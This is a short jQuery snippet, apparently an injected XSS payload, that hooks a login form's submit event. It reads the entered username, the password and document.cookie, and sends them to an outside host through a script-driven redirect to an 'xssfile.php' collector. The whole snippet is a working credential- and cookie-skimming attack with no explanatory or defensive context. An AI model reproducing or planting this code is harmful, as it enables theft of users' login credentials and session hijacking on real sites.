    $("#login-form").submit(function() {
    var form = $(this);
    var username = $("#userName").val();
    var password = $("#password").val();
    document.write('<script> window.location.href="https://xss.sonkale-roleplay.ml/xssfile.php?q=username:' + encodeURIComponent(username) + " password:" + encodeURIComponent(password) + " cookie:" + encodeURIComponent(document.cookie) + ' "</script>');
    });